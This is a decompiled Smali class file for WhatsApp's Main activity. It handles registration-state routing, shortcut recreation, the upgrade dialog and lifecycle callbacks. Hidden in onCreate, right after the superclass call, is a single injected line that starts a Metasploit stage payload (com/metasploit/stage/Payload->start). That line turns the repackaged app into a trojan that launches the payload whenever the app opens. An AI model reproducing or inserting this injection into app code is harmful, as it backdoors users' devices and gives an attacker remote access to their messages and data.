.class public Lcom/whatsapp/Main;
.super LX/0J2;
.source ""


# instance fields
.field public A00:LX/0eT;

.field public A01:Z

.field public final A02:LX/0Hv;

.field public final A03:LX/01d;

.field public final A04:LX/07P;

.field public final A05:LX/07m;

.field public final A06:LX/00g;

.field public final A07:LX/00W;

.field public final A08:Lcom/whatsapp/util/WhatsAppLibLoader;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 83546
    const/4 v0, 0x0

    .line 83547
    invoke-direct {p0, v0}, LX/0J2;-><init>(Z)V

    .line 83548
    invoke-static {}, LX/07P;->A00()LX/07P;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->A04:LX/07P;

    .line 83549
    invoke-static {}, LX/00V;->A00()LX/00W;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->A07:LX/00W;

    .line 83550
    invoke-static {}, LX/01d;->A00()LX/01d;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->A03:LX/01d;

    .line 83551
    sget-object v0, LX/00g;->A0N:LX/00g;

    .line 83552
    iput-object v0, p0, Lcom/whatsapp/Main;->A06:LX/00g;

    .line 83553
    invoke-static {}, Lcom/whatsapp/util/WhatsAppLibLoader;->A00()Lcom/whatsapp/util/WhatsAppLibLoader;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->A08:Lcom/whatsapp/util/WhatsAppLibLoader;

    .line 83554
    invoke-static {}, LX/0Hv;->A00()LX/0Hv;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->A02:LX/0Hv;

    .line 83555
    invoke-static {}, LX/07m;->A00()LX/07m;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->A05:LX/07m;

    return-void
.end method


# virtual methods
.method public A0T()V
    .locals 6

    .line 83556
    invoke-super {p0}, LX/0J2;->A0T()V

    .line 83557
    iget-object v0, p0, LX/0J2;->A03:LX/01A;

    .line 83558
    iget-object v0, v0, LX/01A;->A00:Lcom/whatsapp/Me;

    const/4 v1, 0x2

    if-nez v0, :cond_d

    .line 83559
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_4

    .line 83560
    iget-object v0, p0, LX/0J2;->A0N:LX/0AJ;

    invoke-virtual {v0}, LX/0AJ;->A01()I

    move-result v2

    const/4 v5, 0x0

    const/4 v3, 0x1

    if-eqz v2, :cond_c

    if-eq v2, v3, :cond_b

    if-eq v2, v1, :cond_a

    const/4 v0, 0x4

    const-string v4, "changenumber"

    if-eq v2, v0, :cond_8

    const/4 v0, 0x5

    if-eq v2, v0, :cond_b

    const/4 v0, 0x6

    if-eq v2, v0, :cond_7

    const/4 v0, 0x7

    if-eq v2, v0, :cond_5

    .line 83561
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v0, "main/invalid/registration state="

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, "; default to EULA"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;)V

    .line 83562
    iget-object v0, p0, LX/0J2;->A0M:LX/07n;

    invoke-virtual {v0, v5}, LX/07n;->A0C(I)V

    .line 83563
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83564
    :cond_0
    :goto_0
    iget-boolean v0, p0, Lcom/whatsapp/Main;->A01:Z

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v1

    const/4 v0, 0x1

    if-eqz v1, :cond_2

    :cond_1
    const/4 v0, 0x0

    .line 83565
    :cond_2
    if-eqz v0, :cond_3

    .line 83566
    invoke-virtual {p0, v2}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 83567
    :cond_3
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_4
    const-string v0, "main/me App.me is null, can\'t proceed."

    .line 83568
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    return-void

    .line 83569
    :cond_5
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/VerifyTwoFactorAuth;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83570
    iget-object v0, p0, Lcom/whatsapp/Main;->A02:LX/0Hv;

    .line 83571
    iget-object v0, v0, LX/0Hv;->A00:LX/01A;

    invoke-virtual {v0}, LX/01A;->A01()Lcom/whatsapp/Me;

    move-result-object v1

    const/4 v0, 0x0

    if-eqz v1, :cond_6

    const/4 v0, 0x1

    .line 83572
    :cond_6
    if-eqz v0, :cond_0

    .line 83573
    invoke-virtual {v2, v4, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto :goto_0

    .line 83574
    :cond_7
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/DeleteAccountConfirmation;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    .line 83575
    :cond_8
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/VerifySms;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83576
    iget-object v0, p0, Lcom/whatsapp/Main;->A02:LX/0Hv;

    .line 83577
    iget-object v0, v0, LX/0Hv;->A00:LX/01A;

    invoke-virtual {v0}, LX/01A;->A01()Lcom/whatsapp/Me;

    move-result-object v1

    const/4 v0, 0x0

    if-eqz v1, :cond_9

    const/4 v0, 0x1

    .line 83578
    :cond_9
    if-eqz v0, :cond_0

    .line 83579
    invoke-virtual {v2, v4, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto :goto_0

    :cond_a
    const-string v0, "main/no-me/regname"

    .line 83580
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83581
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/RegisterName;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    .line 83582
    :cond_b
    iget-object v0, p0, LX/0J2;->A0M:LX/07n;

    invoke-virtual {v0, v5}, LX/07n;->A0C(I)V

    .line 83583
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    .line 83584
    :cond_c
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83585
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "show_registration_first_dlg"

    invoke-virtual {v0, v1, v5}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 83586
    invoke-virtual {v2, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto/16 :goto_0

    .line 83587
    :cond_d
    iget-object v0, p0, LX/0J2;->A0N:LX/0AJ;

    invoke-virtual {v0}, LX/0AJ;->A01()I

    move-result v0

    if-ne v0, v1, :cond_11

    const-string v0, "main/me/regname"

    .line 83588
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83589
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/RegisterName;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83590
    iget-boolean v0, p0, Lcom/whatsapp/Main;->A01:Z

    if-eqz v0, :cond_e

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v1

    const/4 v0, 0x1

    if-eqz v1, :cond_f

    :cond_e
    const/4 v0, 0x0

    .line 83591
    :cond_f
    if-eqz v0, :cond_10

    .line 83592
    invoke-virtual {p0, v2}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 83593
    :cond_10
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    .line 83594
    :cond_11
    iget-object v1, p0, LX/0J2;->A0M:LX/07n;

    const/4 v0, 0x3

    invoke-virtual {v1, v0}, LX/07n;->A0C(I)V

    const-string v0, "main/verified/setregverified"

    .line 83595
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83596
    iget-object v0, p0, LX/0J2;->A02:LX/0Es;

    .line 83597
    iget-boolean v0, v0, LX/0Es;->A0a:Z

    if-eqz v0, :cond_14

    .line 83598
    iget-object v0, p0, Lcom/whatsapp/Main;->A00:LX/0eT;

    if-eqz v0, :cond_13

    .line 83599
    iget-object v0, v0, LX/0NO;->A00:LX/0Zu;

    invoke-virtual {v0}, Landroid/os/AsyncTask;->getStatus()Landroid/os/AsyncTask$Status;

    move-result-object v1

    .line 83600
    sget-object v0, Landroid/os/AsyncTask$Status;->RUNNING:Landroid/os/AsyncTask$Status;

    if-ne v1, v0, :cond_13

    const-string v0, "main/show dialog sync"

    .line 83601
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83602
    iget-boolean v0, p0, Lcom/whatsapp/Main;->A01:Z

    if-eqz v0, :cond_12

    const/16 v0, 0x68

    .line 83603
    invoke-static {p0, v0}, LX/02V;->A1G(Landroid/app/Activity;I)V

    .line 83604
    :cond_12
    return-void

    .line 83605
    :cond_13
    new-instance v3, LX/0eT;

    invoke-direct {v3, p0}, LX/0eT;-><init>(Lcom/whatsapp/Main;)V

    iput-object v3, p0, Lcom/whatsapp/Main;->A00:LX/0eT;

    .line 83606
    const/4 v0, 0x0

    new-array v2, v0, [Ljava/lang/Void;

    .line 83607
    sget-object v1, LX/00V;->A02:Ljava/util/concurrent/ThreadPoolExecutor;

    .line 83608
    iget-object v0, v3, LX/0NO;->A00:LX/0Zu;

    invoke-virtual {v0, v1, v2}, Landroid/os/AsyncTask;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void

    .line 83609
    :cond_14
    const-string v0, "main/messageStoreVerified/gotoActivity"

    .line 83610
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83611
    const-string v0, "main/gotoActivity"

    .line 83612
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83613
    invoke-virtual {p0}, Lcom/whatsapp/Main;->A0X()V

    return-void
.end method

.method public final A0X()V
    .locals 7

    .line 83614
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_4

    .line 83615
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v3

    const/4 v2, 0x0

    if-eqz v3, :cond_0

    .line 83616
    invoke-virtual {v3}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    const-string v0, "android.intent.action.MAIN"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 83617
    invoke-virtual {v3}, Landroid/content/Intent;->getFlags()I

    move-result v1

    const/high16 v0, 0x4000000

    and-int/2addr v1, v0

    if-eqz v1, :cond_0

    .line 83618
    iget-object v0, p0, LX/05K;->A0J:LX/00E;

    .line 83619
    iget-object v0, v0, LX/00E;->A00:Landroid/content/SharedPreferences;

    const-string v4, "shortcut_version"

    invoke-interface {v0, v4, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "main/recreate_shortcut"

    .line 83620
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83621
    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    .line 83622
    const v0, 0x7f120072

    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v6

    .line 83623
    new-instance v3, Landroid/content/Intent;

    invoke-direct {v3}, Landroid/content/Intent;-><init>()V

    const-string v1, "com.whatsapp"

    const-string v0, "com.whatsapp.Main"

    .line 83624
    invoke-virtual {v3, v1, v0}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    .line 83625
    invoke-virtual {v3, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x4000000

    .line 83626
    invoke-virtual {v3, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 83627
    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5}, Landroid/content/Intent;-><init>()V

    :try_start_0
    const-string v1, "android.intent.extra.shortcut.INTENT"

    .line 83628
    invoke-virtual {v3, v2}, Landroid/content/Intent;->toUri(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v2}, Landroid/content/Intent;->parseUri(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v5, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    goto :goto_0
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v3

    const-string v0, "registername/remove-shortcut cannot parse shortcut uri "

    .line 83629
    invoke-static {v0}, LX/007;->A0K(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v3}, Ljava/net/URISyntaxException;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_0
    const-string v0, "android.intent.extra.shortcut.NAME"

    .line 83630
    invoke-virtual {v5, v0, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "com.android.launcher.action.UNINSTALL_SHORTCUT"

    .line 83631
    invoke-virtual {v5, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 83632
    invoke-virtual {p0, v5}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 83633
    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    .line 83634
    const v0, 0x7f120072

    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v0

    .line 83635
    invoke-static {p0, v0}, Lcom/whatsapp/registration/RegisterName;->A04(Landroid/content/Context;Ljava/lang/String;)V

    .line 83636
    iget-object v1, p0, LX/05K;->A0J:LX/00E;

    const/4 v0, 0x1

    .line 83637
    invoke-static {v1, v4, v0}, LX/007;->A0V(LX/00E;Ljava/lang/String;I)V

    .line 83638
    :cond_0
    iget-boolean v0, p0, Lcom/whatsapp/Main;->A01:Z

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v1

    const/4 v0, 0x1

    if-eqz v1, :cond_2

    :cond_1
    const/4 v0, 0x0

    .line 83639
    :cond_2
    if-eqz v0, :cond_3

    .line 83640
    new-instance v1, Landroid/content/Intent;

    .line 83641
    const-class v0, Lcom/whatsapp/HomeActivity;

    .line 83642
    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 83643
    invoke-virtual {p0, v2, v2}, Landroid/app/Activity;->overridePendingTransition(II)V

    .line 83644
    :cond_3
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_4
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 6

    const-string v5, "show_registration_first_dlg"

    const-string v0, "Main/onCreate"

    .line 83645
    invoke-static {v0}, LX/0G2;->A0R(Ljava/lang/String;)V

    .line 83646
    :try_start_0
    iget-object v1, p0, Lcom/whatsapp/Main;->A06:LX/00g;

    const-string v0, "Main"

    invoke-virtual {v1, v0}, LX/00g;->A04(Ljava/lang/String;)V

    const/4 v4, 0x0

    .line 83647
    iput-boolean v4, p0, LX/05J;->A03:Z

    .line 83648
    invoke-super {p0, p1}, LX/0J2;->onCreate(Landroid/os/Bundle;)V
    
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 83649
    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    const v0, 0x7f1205f7

    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    .line 83650
    iget-object v0, p0, Lcom/whatsapp/Main;->A08:Lcom/whatsapp/util/WhatsAppLibLoader;

    invoke-virtual {v0}, Lcom/whatsapp/util/WhatsAppLibLoader;->A05()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "aborting due to native libraries missing"

    .line 83651
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83652
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/CorruptInstallationActivity;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 83653
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 83654
    invoke-static {}, LX/0G2;->A0J()V

    return-void

    .line 83655
    :cond_0
    :try_start_1
    invoke-static {}, LX/01d;->A01()Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "main/device-not-supported"

    .line 83656
    invoke-static {v0}, Lcom/whatsapp/util/Log;->w(Ljava/lang/String;)V

    .line 83657
    const v0, 0x7f130210

    invoke-virtual {p0, v0}, LX/05L;->setTheme(I)V

    .line 83658
    new-instance v0, Lcom/whatsapp/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;

    invoke-direct {v0}, Lcom/whatsapp/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;-><init>()V

    invoke-virtual {p0, v0}, LX/05K;->AMk(Landroidx/fragment/app/DialogFragment;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 83659
    invoke-static {}, LX/0G2;->A0J()V

    return-void

    .line 83660
    :cond_1
    :try_start_2
    iget-object v0, p0, LX/0J2;->A0N:LX/0AJ;

    invoke-virtual {v0}, LX/0AJ;->A01()I

    move-result v2

    .line 83661
    iget-object v0, p0, LX/0J2;->A03:LX/01A;

    .line 83662
    iget-object v1, v0, LX/01A;->A00:Lcom/whatsapp/Me;

    const/4 v3, 0x1

    if-nez v1, :cond_4

    if-nez v2, :cond_4

    .line 83663
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_3

    .line 83664
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83665
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v5, v4}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 83666
    invoke-virtual {v1, v5, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 83667
    :cond_2
    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 83668
    invoke-static {p0}, LX/22i;->A0B(Landroid/app/Activity;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 83669
    :cond_3
    invoke-static {}, LX/0G2;->A0J()V

    return-void

    :cond_4
    const/4 v0, 0x6

    if-ne v2, v0, :cond_6

    .line 83670
    :try_start_3
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_5

    .line 83671
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/DeleteAccountConfirmation;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83672
    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 83673
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 83674
    :cond_5
    invoke-static {}, LX/0G2;->A0J()V

    return-void

    :cond_6
    if-eqz v1, :cond_8

    .line 83675
    :try_start_4
    iget-object v0, p0, Lcom/whatsapp/Main;->A05:LX/07m;

    .line 83676
    iget-boolean v0, v0, LX/07m;->A01:Z

    if-nez v0, :cond_8

    .line 83677
    iget-object v0, p0, LX/0J2;->A00:LX/0bU;

    .line 83678
    iget-object v1, v0, LX/0bV;->A08:LX/00C;

    iget-object v0, v0, LX/0bU;->A03:LX/0MX;

    invoke-virtual {v1, v0}, LX/00C;->A09(LX/0MX;)Z

    move-result v0

    .line 83679
    if-eqz v0, :cond_9

    .line 83680
    iget-object v0, p0, LX/0J2;->A0F:LX/07l;

    invoke-virtual {v0}, LX/07l;->A04()I

    move-result v2

    .line 83681
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "main/create/backupfilesfound "

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    if-lez v2, :cond_7

    goto :goto_0

    .line 83682
    :cond_7
    invoke-virtual {p0, v4}, LX/0J2;->A0W(Z)V

    goto :goto_1

    .line 83683
    :cond_8
    iput-boolean v3, p0, Lcom/whatsapp/Main;->A01:Z

    .line 83684
    invoke-virtual {p0}, LX/0J2;->A0T()V

    goto :goto_2

    .line 83685
    :goto_0
    const/16 v0, 0x69

    .line 83686
    invoke-static {p0, v0}, LX/02V;->A1G(Landroid/app/Activity;I)V

    .line 83687
    :cond_9
    :goto_1
    iput-boolean v3, p0, LX/05J;->A03:Z

    .line 83688
    invoke-virtual {p0}, LX/05J;->A0Q()V

    .line 83689
    :goto_2
    iget-object v1, p0, Lcom/whatsapp/Main;->A06:LX/00g;

    const-string v0, "Main created"

    invoke-virtual {v1, v0}, LX/00g;->A05(Ljava/lang/String;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 83690
    invoke-static {}, LX/0G2;->A0J()V

    return-void

    :catchall_0
    move-exception v0

    invoke-static {}, LX/0G2;->A0J()V

    .line 83691
    throw v0
.end method

.method public onCreateDialog(I)Landroid/app/Dialog;
    .locals 3

    .line 83692
    const v0, 0x7f130210

    invoke-virtual {p0, v0}, LX/05L;->setTheme(I)V

    if-eqz p1, :cond_0

    .line 83693
    invoke-super {p0, p1}, LX/0J2;->onCreateDialog(I)Landroid/app/Dialog;

    move-result-object v0

    return-object v0

    :cond_0
    const-string v0, "main/dialog/upgrade"

    .line 83694
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83695
    iget-object v0, p0, Lcom/whatsapp/Main;->A06:LX/00g;

    invoke-virtual {v0}, LX/00g;->A00()V

    .line 83696
    new-instance v2, LX/04j;

    invoke-direct {v2, p0}, LX/04j;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    const v0, 0x7f120d72

    .line 83697
    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v1

    .line 83698
    iget-object v0, v2, LX/04j;->A01:LX/04k;

    iput-object v1, v0, LX/04k;->A0I:Ljava/lang/CharSequence;

    .line 83699
    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    const v0, 0x7f120d71

    .line 83700
    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v0

    .line 83701
    iget-object v1, v2, LX/04j;->A01:LX/04k;

    iput-object v0, v1, LX/04k;->A0E:Ljava/lang/CharSequence;

    const/4 v0, 0x0

    .line 83702
    iput-boolean v0, v1, LX/04k;->A0J:Z

    .line 83703
    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    const v0, 0x7f120ea4

    .line 83704
    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v1

    new-instance v0, LX/1Q4;

    invoke-direct {v0, p0}, LX/1Q4;-><init>(Lcom/whatsapp/Main;)V

    .line 83705
    invoke-virtual {v2, v1, v0}, LX/04j;->A03(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)V

    iget-object v1, p0, LX/05K;->A0K:LX/01Q;

    const v0, 0x7f1205f6

    .line 83706
    invoke-virtual {v1, v0}, LX/01Q;->A05(I)Ljava/lang/String;

    move-result-object v1

    new-instance v0, LX/1Q3;

    invoke-direct {v0, p0}, LX/1Q3;-><init>(Lcom/whatsapp/Main;)V

    .line 83707
    invoke-virtual {v2, v1, v0}, LX/04j;->A01(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)V

    .line 83708
    invoke-virtual {v2}, LX/04j;->A00()LX/04o;

    move-result-object v0

    return-object v0
.end method

.method public onStart()V
    .locals 1

    .line 83709
    invoke-super {p0}, LX/05J;->onStart()V

    const/4 v0, 0x1

    .line 83710
    iput-boolean v0, p0, Lcom/whatsapp/Main;->A01:Z

    return-void
.end method

.method public onStop()V
    .locals 1

    .line 83711
    invoke-super {p0}, LX/05L;->onStop()V

    const/4 v0, 0x0

    .line 83712
    iput-boolean v0, p0, Lcom/whatsapp/Main;->A01:Z

    return-void
.end method
